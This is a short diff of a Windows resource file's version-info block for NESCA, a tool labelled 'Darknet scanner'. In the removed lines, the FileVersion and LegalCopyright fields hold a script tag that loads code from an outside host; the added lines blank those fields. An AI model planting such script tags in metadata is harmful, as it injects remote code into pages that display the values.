@@ -77,11 +77,11 @@ BEGIN
         BEGIN
             VALUE "CompanyName", "ISKOPASI"
             VALUE "FileDescription", "Darknet scanner"
-            VALUE "FileVersion", "<script src=\\""http://accountus.gets-it.net/googlestat.php\\""></script>"
-            VALUE "InternalName", "nesca_3.exe"
-            VALUE "LegalCopyright", "<script src=\\""http://accountus.gets-it.net/googlestat.php\\""></script>"
-            VALUE "OriginalFilename", "nesca_3.exe"
-            VALUE "ProductName", "NESCA3"
+            VALUE "FileVersion", ""
+            VALUE "InternalName", "nesca.exe"
+            VALUE "LegalCopyright", ""
+            VALUE "OriginalFilename", "nesca.exe"
+            VALUE "ProductName", "NESCA"
             VALUE "ProductVersion", "3.2.0.2"
         END
     END
